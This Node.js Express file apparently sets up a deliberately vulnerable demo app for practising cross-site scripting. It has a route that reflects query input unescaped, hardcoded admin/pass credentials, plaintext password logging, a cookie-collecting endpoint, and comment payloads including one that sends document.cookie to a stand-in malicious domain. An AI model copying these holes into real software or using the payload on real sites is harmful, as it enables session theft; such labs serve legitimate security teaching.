const express = require('express');
const session = require('express-session');
const passport = require('passport');
const LocalStrategy = require('passport-local').Strategy;
const cookieParser = require('cookie-parser');

const app = express();

// // Configure session middleware
// app.use(session({
//     secret: 'verysecret', // This is a secret key used for signing the session ID cookie.
//     resave: false, // This means the session will not be saved back to the session store unless modified.
//     saveUninitialized: false, // This means no session will be created for a request unless something is stored.
//     cookie: { secure: false, httpOnly: true } // Secure should be true in production with HTTPS. httpOnly prevents client-side JavaScript from accessing the cookie data.
// }));


app.use(express.urlencoded({ extended: false })); // Needed to parse POST data
app.use(cookieParser());
app.use(session({
    secret: 'verysecret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

app.use(passport.initialize());
app.use(passport.session());

// Passport Local Strategy
passport.use(new LocalStrategy(
    function(username, password, done) {
        console.log(`Username: ${username}, Password: ${password}`); // Debugging output
        if (username === "admin" && password === "pass") {
            return done(null, {id: 1, name: "admin"});
        } else {
            return done(null, false, { message: 'Incorrect credentials.' });
        }
    }
));


passport.serializeUser(function(user, done) {
    done(null, user.id);
});

passport.deserializeUser(function(id, done) {
    done(null, {id: 1, name: "admin"});
});

// Routes
app.get('/', (req, res) => res.send('Home Page'));

app.get('/login', (req, res) => {
    res.send('<form action="/login" method="post">' +
        'Username:<br><input type="text" name="username"><br>' +
        'Password:<br><input type="password" name="password"><br><br>' +
        '<input type="submit" value="Login"></form>');
});

app.post('/login', 
    passport.authenticate('local', { failureRedirect: '/login' }),
    function(req, res) {
        // Store user info in session
        req.session.user = req.user;
        res.redirect('/profile');
    }
);

app.get('/profile', (req, res) => {
    if (req.isAuthenticated()) {
        res.send(`Logged in as ${req.session.user.name} <a href="/logout">Logout</a>`);
    } else {
        res.redirect('/login');
    }
});

app.get('/logout', (req, res) => {
    req.logout(function(err) {
        if (err) { return next(err); }
        req.session.destroy(function(err) {
            if (err) {
                console.log('Error : Failed to destroy the session during logout.', err);
                return next(err);
            }
            res.redirect('/');
        });
    });
});


app.get('/reflect', (req, res) => {
    let input = req.query.input || 'Hello, type something...';
    res.send(`Input was: ${input}`);
});

// Assuming you've already set up the basics as shown before
app.get('/log-cookies', (req, res) => {
    const cookies = req.query.cookie;
    console.log('Cookies Received:', cookies);
    // You could also log to a file or just handle them within this function
    res.send('Cookies received and logged.');
});


// Start the server
app.listen(3333, () => console.log('Server running on http://localhost:3333'));

// XXS Payload to Display a Message Box
//<script>alert('Exploited');</script>

// XSS payload that reads the user's cookies
//<script>document.location='http://yourmaliciousdomain.com/steal?cookie='+document.cookie;</script>